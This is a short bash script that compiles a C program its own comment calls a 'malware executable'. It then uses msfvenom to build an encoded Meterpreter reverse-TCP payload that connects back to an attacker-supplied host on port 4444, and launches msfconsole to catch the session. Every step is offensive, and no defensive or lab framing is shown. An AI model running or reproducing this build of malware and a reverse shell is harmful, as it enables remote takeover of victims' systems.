#!/bin/bash

set -e

# Build malware executable
gcc -g -I/libpcap-1.8.1/pcap virus.c -lpcap

# Create binary version of exploit
sudo msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -e x86/shikata_ga_nai -f elf -o exploit

# Start the console with the script file
msfconsole -r meterpreter_script.rc
